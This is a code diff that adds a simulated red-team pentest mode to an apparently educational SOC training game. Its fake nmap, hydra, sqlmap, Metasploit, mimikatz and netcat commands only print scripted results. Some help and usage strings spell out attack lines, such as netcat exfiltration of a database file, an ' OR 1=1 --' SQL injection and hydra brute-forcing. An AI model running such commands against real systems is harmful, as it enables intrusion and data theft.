@@ -4,8 +4,9 @@
 // ============================================================
 
 import { normalizar, listar, leer, buscar } from "./filesystem.js";
-import { GAME, estadoRango } from "./state.js";
+import { GAME, estadoRango, estadoRangoRT } from "./state.js";
 import { numCaso } from "./casos.js";
+import { numCasoRT } from "./rt-casos.js";
 
 const AYUDA = {
   "ayuda": "ayuda [comando] — lista los comandos disponibles o explica uno",
@@ -34,6 +35,19 @@ const AYUDA = {
   "curl": "curl <url> — obtiene la respuesta de una URL",
   "vt": "vt <hash> — consulta VirusTotal por hash",
   "pista": "pista — pide una pista al supervisor (cuesta puntos)",
+  "nmap": "nmap <ip|rango> — escanea puertos y servicios (red team)",
+  "gobuster": "gobuster <url> — descubre directorios en un servidor web",
+  "nikto": "nikto <url> — analiza vulnerabilidades del servidor web",
+  "searchsploit": "searchsploit <texto> — busca exploits en la base local",
+  "hydra": "hydra <servicio> <host> -u <usuario> -w <wordlist> — fuerza bruta de credenciales",
+  "ssh": "ssh <usuario>@<host> — conéctate a un servidor con credenciales conocidas",
+  "sqlmap": "sqlmap -u <url> --dump — detecta y explota inyecciones SQL",
+  "msf": "msf <exploit> <objetivo> — lanza un exploit con Metasploit (alias: msfconsole)",
+  "mimikatz": "mimikatz <host> — extrae credenciales de la memoria (Windows)",
+  "john": "john <archivo> — crackea hashes con diccionario (alias: hashcat)",
+  "nc": "nc <host> <puerto> [< <archivo>] — exfiltra datos por netcat",
+  "exfiltrar": "exfiltrar <archivo> — copia un archivo a tu máquina de pentest",
+  "escalar_priv": "escalar_priv <objetivo> — escala privilegios en el sistema comprometido",
   "bloquear": "bloquear <dominio|ip|url>:<valor> — bloquea un indicador en firewall/pasarela",
   "aislar": "aislar <host> — aísla un host de la red",
   "deshabilitar": "deshabilitar <usuario> — deshabilita una cuenta comprometida",
@@ -123,7 +137,8 @@ export function crearComandos(ctx) {
 
     "ver_caso"(a) {
       const c = engine.caso;
-      term.separator(`CASO #${String(numCaso(c.id)).padStart(2, "0")} — ${c.titulo}`);
+      const num = c.modo === "rt" ? numCasoRT(c.id) : numCaso(c.id);
+      term.separator(`${c.modo === "rt" ? "PENTEST" : "CASO"} #${String(num).padStart(2, "0")} — ${c.titulo}`);
       out(`Severidad: ${c.severidad}  |  SLA: ${Math.floor(c.sla / 60)} min  |  Nivel: ${c.nivel}  |  XP: ${c.xp}`, "t-out-info");
       term.print("");
       out(c.briefing, "t-out");
@@ -359,9 +374,38 @@ export function crearComandos(ctx) {
     nslookup: (a) => cmds.dig(a),
 
     curl(a) {
-      const url = (a || "").trim();
-      if (!url) { term.printErr("Uso: curl <url>"); return; }
+      const parts = (a || "").trim().split(/\s+/);
+      let user = null, pass = null, url = null;
+      for (let i = 0; i < parts.length; i++) {
+        if (parts[i] === "-u") {
+          const cred = (parts[i + 1] || "").split(":");
+          user = cred[0]; pass = cred[1]; i++;
+        } else if (!url) url = parts[i];
+      }
+      if (!url) { term.printErr("Uso: curl [-u usuario:password] <url>"); return; }
       const c = engine.caso;
+      // Modo red team: web del caso (con login opcional)
+      if (c.web) {
+        for (const [base, w] of Object.entries(c.web)) {
+          if (!url.startsWith(base)) continue;
+          const rk = url.slice(base.length).replace(/\/$/, "");
+          const contenido = w.rutas && w.rutas[rk] !== undefined ? w.rutas[rk] : rk === "" ? (w.raiz || "") : null;
+          if (contenido === null) { out(`curl: (7) 404 Not Found en ${url}`, "t-out-dim"); return; }
+          out(contenido, "t-out");
+          if (w.login && rk === w.login.url && user !== null) {
+            if (user === w.login.usuario && pass === w.login.password) {
+              out("→ Login correcto. Bienvenido, administrador.", "t-out-ok");
+              engine.completar("acceso", url);
+            } else {
+              out("→ 401 Unauthorized: credenciales incorrectas.", "t-out-warn");
+            }
+          }
+          return;
+        }
+        out(`curl: (7) Failed to connect. ${url} no está en el scope del engagement.`, "t-out-dim");
+        return;
+      }
+      // Modo SOC: urls clásicas
       if (c.urls && c.urls[url] !== undefined) {
         out(c.urls[url], "t-out");
         return;
@@ -374,6 +418,259 @@ export function crearComandos(ctx) {
         }
       }
       out(`curl: (7) Failed to connect. La URL ${url} no responde (no está en la base del simulador).`, "t-out-dim");
+    },
+
+    // ---------- Comandos red team (pentest ofensivo) ----------
+    nmap(a) {
+      const objetivo = (a || "").trim();
+      if (!objetivo) { term.printErr("Uso: nmap <ip|rango>  (ej: nmap 10.10.10.0/24)"); return; }
+      const c = engine.caso;
+      const r = c.red || {};
+      const sub = r.subredes && r.subredes[objetivo];
+      if (sub) {
+        term.separator(`NMAP SCAN — ${objetivo} (${sub.desc})`);
+        out(`Hosts activos (${sub.activos.length}):`, "t-out");
+        for (const ip of sub.activos) {
+          const h = r.hosts && r.hosts[ip];
+          out(`  ${ip}  ${h ? h.hostname : "(sin resolver)"}`, "t-out-hi");
+        }
+        out("Usa `nmap <ip>` para el detalle de puertos de cada host.", "t-out-dim");
+        return;
+      }
+      const h = r.hosts && r.hosts[objetivo];
+      if (!h) {
+        out(`nmap: ${objetivo} no responde al escaneo (fuera del scope autorizado).`, "t-out-dim");
+        return;
+      }
+      term.separator(`NMAP SCAN — ${objetivo} (${h.hostname})`);
+      out("Host is up (0.045s latency).", "t-out-dim");
+      out(`OS: ${h.os}`, "t-out");
+      out("PORT     STATE  SERVICE", "t-out-dim");
+      out(h.puertos.split("\n").map((l) => "  " + l).join("\n"), "t-out-hi");
+      engine.completar("recon", objetivo);
+      const base = Object.keys(c.web || {}).find((u) => u.includes(objetivo));
+      if (base) out(`Sugerencia: enumera directorios con \`gobuster ${base}\` y vulnerabilidades con \`nikto ${base}\`.`, "t-out-dim");
+    },
+
+    gobuster(a) {
+      const url = (a || "").trim();
+      if (!url) { term.printErr("Uso: gobuster <url>  (ej: gobuster http://10.10.10.5)"); return; }
+      const c = engine.caso;
+      const w = c.web && c.web[url];
+      if (!w || !w.dirs) { out(`gobuster: ${url} no responde o no hay directorios en la base local.`, "t-out-dim"); return; }
+      term.separator(`GOBUSTER — ${url}`);
+      for (const d of w.dirs) {
+        out(`[+] ${d} (Status: 200, Size: ${800 + d.length * 7})`, /admin|backup|upload|api/i.test(d) ? "t-out-hi" : "t-out");
+      }
+      for (const target of (c.correctas.recon || [])) {
+        const valor = target.slice(target.indexOf(":") + 1).toLowerCase();
+        if (valor.startsWith(url.toLowerCase() + "/")) engine.completar("recon", valor);
+      }
+    },
+
+    nikto(a) {
+      const url = (a || "").trim();
+      if (!url) { term.printErr("Uso: nikto <url>"); return; }
+      const c = engine.caso;
+      const w = c.web && c.web[url];
+      if (!w || !w.nikto) { out(`nikto: sin hallazgos para ${url} en la base local.`, "t-out-dim"); return; }
+      term.separator(`NIKTO — ${url}`);
+      out(`- Nikto v2.5.0`, "t-out-dim");
+      w.nikto.forEach((n) => out(`+ ${n}`, "t-out-warn"));
+      for (const target of (c.correctas.recon || [])) {
+        const valor = target.slice(target.indexOf(":") + 1).toLowerCase();
+        if (valor.startsWith(url.toLowerCase() + "/")) engine.completar("recon", valor);
+      }
+    },
+
+    searchsploit(a) {
+      const q = (a || "").trim().toLowerCase();
+      if (!q) { term.printErr("Uso: searchsploit <texto>  (ej: searchsploit php upload)"); return; }
+      const res = leer(engine.caso.fs, "/opt/exploitdb/searchsploit.txt");
+      if (!res.ok) { out("searchsploit: la base de exploits local no está disponible en este caso.", "t-out-dim"); return; }
+      const hits = res.contenido.split("\n").filter((l) => l.toLowerCase().includes(q));
+      term.separator(`EXPLOIT-DB (${hits.length} resultados para '${q}')`);
+      if (hits.length === 0) { out("Sin resultados.", "t-out-dim"); return; }
+      for (const l of hits) {
+        const m = /^([^|]+)\s*\|\s*([^|]+)\s*\|\s*(.+)$/.exec(l);
+        if (m) out(`${m[1]}  |  ${m[2].trim()}  |  ${m[3].trim()}`, "t-out");
+        else out(l, "t-out");
+      }
+    },
+
+    hydra(a) {
+      const m = /^(\S+)\s+(\S+)\s+-u\s+(\S+)\s+-w\s+(\S+)/.exec((a || "").trim());
+      if (!m) { term.printErr("Uso: hydra <servicio> <host> -u <usuario> -w <wordlist>  (ej: hydra ssh 10.10.10.20 -u admin -w /opt/wordlists/top1000.txt)"); return; }
+      const [, servicio, host, usuario, wordlist] = m;
+      const c = engine.caso;
+      const entry = (c.credenciales || []).find((x) => x.servicio === servicio.toLowerCase() && x.host === host && x.usuario === usuario);
+      if (!entry) {
+        out(`hydra: ${servicio}://${host} no es objetivo de fuerza bruta (fuera de scope o sin cuentas conocidas).`, "t-out-dim");
+        return;
+      }
+      const res = leer(c.fs, wordlist);
+      if (!res.ok) { term.printErr(`hydra: no se puede leer el diccionario ${wordlist}`); return; }
+      const palabras = res.contenido.split("\n").map((s) => s.trim()).filter(Boolean);
+      const found = palabras.includes(entry.password);
+      term.separator(`HYDRA — ${servicio}://${host} (usuario: ${usuario})`);
+      out(`[DATA] Probando ${palabras.length} passwords contra ${servicio}://${host}`, "t-out-dim");
+      if (found) {
+        out(`[${host}] ${servicio}://${usuario}:${entry.password}  login correcto`, "t-out-hi");
+        if (entry.nota) out(`Nota: ${entry.nota}`, "t-out-info");
+        engine.completar("acceso", host);
+      } else {
+        out("[-] No se encontraron credenciales válidas en el diccionario.", "t-out-warn");
+      }
+    },
+
+    ssh(a) {
+      const m = /^([\w.-]+)@([\d.]+)$/.exec((a || "").trim());
+      if (!m) { term.printErr("Uso: ssh <usuario>@<host>  (ej: ssh admin@10.10.10.20)"); return; }
+      const [, usuario, host] = m;
+      const c = engine.caso;
+      const entry = (c.credenciales || []).find((x) => x.servicio === "ssh" && x.host === host && x.usuario === usuario);
+      if (!entry) {
+        out(`ssh: no se pudo autenticar ${usuario}@${host} con las credenciales conocidas.`, "t-out-err");
+        return;
+      }
+      term.separator(`SSH — ${usuario}@${host}`);
+      out("Bienvenido a Ubuntu 22.04 (GNU/Linux)", "t-out");
+      out("Last login: hoy desde tu maquina", "t-out-dim");
+      const hijos = listar(c.fs, `/home/${usuario}/`);
+      if (hijos.length > 0) {
+        out(`Contenido de /home/${usuario}/:`, "t-out-dim");
+        out(hijos.map((h) => "  " + h).join("\n"), "t-out-hi");
+      }
+      out("", "t-out");
+      engine.completar("acceso", host);
+      out("Sugerencia: `exfiltrar <archivo>` copia un archivo a tu maquina.", "t-out-dim");
+    },
+
+    sqlmap(a) {
+      const m = /^-u\s+(\S+)\s+--dump/.exec((a || "").trim());
+      if (!m) { term.printErr("Uso: sqlmap -u <url> --dump  (ej: sqlmap -u http://10.10.10.30/producto?id=1 --dump)"); return; }
+      const url = m[1];
+      const c = engine.caso;
+      const s = c.sqli;
+      if (!s || s.url !== url) {
+        out(`sqlmap: no se detecta inyección SQL en ${url} (el parámetro parece seguro).`, "t-out-dim");
+        return;
+      }
+      term.separator(`SQLMAP — ${url}`);
+      out(`[INFO] Inyección confirmada: ' OR 1=1 --`, "t-out-hi");
+      out(`[INFO] Base de datos: ${s.db}`, "t-out");
+      out("", "t-out");
+      for (const tabla of s.tablas) {
+        term.separator(`Tabla: ${tabla.nombre} (${tabla.filas.length} filas)`);
+        const cols = Object.keys(tabla.filas[0] || {});
+        out(cols.join("  |  "), "t-out-dim");
+        for (const fila of tabla.filas) out(cols.map((c2) => fila[c2]).join("  |  "), "t-out");
+        engine.completar("exfiltracion", tabla.nombre);
+      }
+      out("", "t-out");
+      out("El hash del admin está en /tmp/hash.txt. `john /tmp/hash.txt` lo descifra.", "t-out-info");
+    },
+
+    msf(a) {
+      const m = /^(\S+)\s+(\S+)$/.exec((a || "").trim());
+      if (!m) { term.printErr("Uso: msf <exploit> <objetivo>  (ej: msf php-upload-rce http://10.10.10.50/upload)"); return; }
+      const [, exploit, objetivo] = m;
+      const c = engine.caso;
+      const e = c.exploits && c.exploits[exploit];
+      if (!e) { out(`msf: el exploit '${exploit}' no está en el framework local. Prueba \`searchsploit\`.`, "t-out-dim"); return; }
+      if (e.objetivo !== objetivo) {
+        out(`msf: ${exploit} no aplica a '${objetivo}'. Objetivo esperado: ${e.objetivo}`, "t-out-warn");
+        return;
+      }
+      term.separator(`METASPLOIT — ${exploit}`);
+      out(e.resultado, "t-out-hi");
+      out("", "t-out");
+      engine.completar("acceso", objetivo);
+      if (/escalad|sudo|root/i.test(e.resultado)) {
+        out("La sesión revela un vector de escalada: usa `escalar_priv` cuando identifiques el objetivo.", "t-out-dim");
+      }
+    },
+    msfconsole: (a) => cmds.msf(a),
+
+    mimikatz(a) {
+      const host = (a || "").trim();
+      if (!host) { term.printErr("Uso: mimikatz <host>  (ej: mimikatz 10.10.10.60)"); return; }
+      const c = engine.caso;
+      const mk = c.mimikatz;
+      if (!mk || mk.host !== host) {
+        out(`mimikatz: no hay sesión elevada en ${host} o el host no es Windows.`, "t-out-dim");
+        return;
+      }
+      term.separator(`MIMIKATZ — ${host}`);
+      out("  .#####.   mimikatz 2.2.0 (x64) — sekurlsa::logonpasswords", "t-out-dim");
+      for (const cred of mk.creds) out("  " + cred, "t-out-hi");
+      if (mk.nota) out("  Nota: " + mk.nota, "t-out-warn");
+      out("", "t-out");
+      engine.completar("escalada", host);
+    },
+
+    john(a) {
+      const archivo = (a || "").trim();
+      if (!archivo) { term.printErr("Uso: john <archivo>  (ej: john /tmp/hash.txt)"); return; }
+      const res = leer(engine.caso.fs, archivo);
+      if (!res.ok) { term.printErr(res.error); return; }
+      const c = engine.caso;
+      const hashMatch = res.contenido.match(/[a-f0-9]{32}/i);
+      const hash = hashMatch ? hashMatch[0].toLowerCase() : null;
+      const info = hash && c.hashes && c.hashes[hash];
+      term.separator(`JOHN THE RIPPER — ${archivo}`);
+      out(`Loaded 1 password hash (${info ? info.tipo : "desconocido"})`, "t-out-dim");
+      if (info) {
+        out(`admin:${info.password}`, "t-out-hi");
+        out("1/1 descifrado. Usa la password para acceder a lo que protege.", "t-out-info");
+      } else {
+        out("No se pudo descifrar con el diccionario local.", "t-out-warn");
+      }
+    },
+    hashcat: (a) => cmds.john(a),
+
+    exfiltrar(a) {
+      const archivo = (a || "").trim();
+      if (!archivo) { term.printErr("Uso: exfiltrar <archivo>  (ej: exfiltrar /data/crown.db)"); return; }
+      const res = leer(engine.caso.fs, archivo);
+      if (!res.ok) { term.printErr(res.error); return; }
+      term.separator(`EXFILTRACIÓN — ${archivo}`);
+      out(res.contenido, "t-out");
+      out("", "t-out");
+      out("✔ Copia transferida a tu maquina de trabajo.", "t-out-ok");
+      engine.completar("exfiltracion", archivo);
+    },
+
+    escalar_priv(a) {
+      const objetivo = (a || "").trim();
+      if (!objetivo) { term.printErr("Uso: escalar_priv <objetivo>  (ej: escalar_priv www-data)"); return; }
+      const c = engine.caso;
+      const canon = (c.correctas.escalada || []).find((x) => x.slice(x.indexOf(":") + 1).toLowerCase() === objetivo.toLowerCase());
+      if (!canon) {
+        out(`escalar_priv: no hay vector de escalada evidente para '${objetivo}' en este sistema.`, "t-out-warn");
+        return;
+      }
+      term.separator("ESCALADA DE PRIVILEGIOS");
+      out("[+] id: uid=0(root) gid=0(root) groups=0(root)", "t-out-hi");
+      out("[+] Has escalado a root. Acceso total al sistema.", "t-out");
+      engine.completar("escalada", objetivo);
+    },
+
+    nc(a) {
+      const m = /^(\S+)\s+(\d+)(?:\s*<\s*(\S+))?$/.exec((a || "").trim());
+      if (!m) { term.printErr("Uso: nc <host> <puerto> [< <archivo>]  (ej: nc 10.10.10.100 4444 < /data/crown.db)"); return; }
+      const [, host, puerto, archivo] = m;
+      if (!archivo) {
+        term.separator(`NETCAT — listener ${host}:${puerto}`);
+        out("Conectado. Esperando datos... (usa: nc <host> <puerto> < <archivo>)", "t-out-dim");
+        return;
+      }
+      const res = leer(engine.caso.fs, archivo);
+      if (!res.ok) { term.printErr(res.error); return; }
+      term.separator(`NETCAT — ${host}:${puerto}`);
+      out(`[*] Transmitiendo ${archivo} (${res.contenido.length} bytes)`, "t-out");
+      out("[*] Transferencia completada. Receptor confirma checksum.", "t-out-ok");
+      engine.completar("exfiltracion", archivo);
     },
 
     vt(a) {
@@ -405,14 +702,18 @@ export function crearComandos(ctx) {
     informe() { engine.abrirInforme(); },
 
     estado() {
-      const r = estadoRango();
+      const esRT = GAME.modo === "rt";
+      const r = esRT ? estadoRangoRT() : estadoRango();
+      const xp = esRT ? GAME.rtXp : GAME.xp;
+      const resueltos = esRT ? GAME.rtCasosResueltos : GAME.casosResueltos;
       term.separator(`ESTADO DE ${GAME.nombre.toUpperCase()}`);
+      out(`Campaña: ${esRT ? "RED TEAM (pentest ofensivo)" : "SOC (defensa)"}`, "t-out");
       out(`Rango: ${r.icono} ${r.nombre}`, "t-out");
-      out(`XP: ${GAME.xp}  |  Puntos: ${GAME.puntos}`, "t-out");
-      out(`Casos resueltos: ${GAME.casosResueltos}  |  Caso actual: ${GAME.casoActual || "ninguno"}`, "t-out");
+      out(`XP: ${xp}  |  Puntos: ${GAME.puntos}`, "t-out");
+      out(`Casos resueltos: ${resueltos}  |  Caso actual: ${GAME.casoActual || "ninguno"}`, "t-out");
       if (engine.caso) {
         out(`SLA restante: ${Math.max(0, engine.caso.sla - GAME.reloj)}s`, "t-out-info");
-        out(`Acciones correctas: ${engine.hecho.size}  |  Errores: ${engine.errores}  |  Pistas: ${engine.pistasUsadas}`, "t-out-info");
+        out(`Objetivos cumplidos: ${engine.hecho.size}  |  Errores: ${engine.errores}  |  Pistas: ${engine.pistasUsadas}`, "t-out-info");
       }
     },
 
@@ -427,7 +728,7 @@ export function crearComandos(ctx) {
     },
 
     salir() {
-      out("No puedes salir. El SOC no duerme.", "t-out-warn");
+      out(GAME.modo === "rt" ? "El contrato de pentest no termina hasta entregar el informe." : "No puedes salir. El SOC no duerme.", "t-out-warn");
     },
   };
 
